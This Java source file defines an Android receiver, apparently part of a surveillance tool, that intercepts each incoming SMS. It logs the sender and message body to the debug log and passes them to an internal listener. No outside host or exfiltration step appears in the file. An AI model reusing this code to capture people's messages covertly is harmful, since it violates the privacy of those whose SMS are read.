package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.ht.RCSAndroidGUI.Sms;

public class BroadcastMonitorSms extends BroadcastReceiver {
	private static final String TAG = "SmsBroadcastMonitor";
	
	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();

		if (bundle == null)
			return;
		
		SmsMessage[] msgs = null;
		String str = "";

		// Prendiamo l'sms
		Object[] pdus = (Object[]) bundle.get("pdus");
		msgs = new SmsMessage[pdus.length];

		for (int i = 0; i < msgs.length; i++) {
			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
			
			str += "SMS from " + msgs[i].getOriginatingAddress();
			str += " :";
			str += msgs[i].getMessageBody().toString();
			str += "\n";

			Log.d("QZ", TAG + " (onReceiveSms): " + str);
			
			ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), false));
		}
	}
}
